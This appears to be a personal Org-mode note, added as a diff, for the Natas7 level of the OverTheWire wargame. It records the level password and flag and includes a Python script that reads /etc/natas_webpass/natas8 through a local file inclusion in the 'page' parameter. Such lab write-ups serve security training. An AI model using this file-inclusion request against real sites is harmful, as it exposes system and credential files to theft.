@@ -1,0 +1,53 @@
+:PROPERTIES:
+:ID:       2f0c9708-04e6-4978-a6bd-5350e4f35804
+:END:
+#+title: Natas7
+* Previous
+[[id:340c47e7-79cb-4c63-b606-2d80357a56cc][Natas6]]
+
+* Password
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+* Flag
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+* Notes
+
+In the source html :
+#+begin_src html
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+#+end_src
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas7"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+response = requests.get(url +  "index.php?page=/etc/natas_webpass/natas8", auth=(username, password))
+
+content = response.text
+# print(content)
+
+p = re.findall("([a-zA-Z0-9]{32})", content)
+
+if p and p[0] == password:
+    p.pop(0)
+
+print(p[0])
+#+end_src
+
+#+RESULTS:
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+* Next
+[[id:04a1eb05-1de8-4629-9073-71aebd900829][Natas8]]
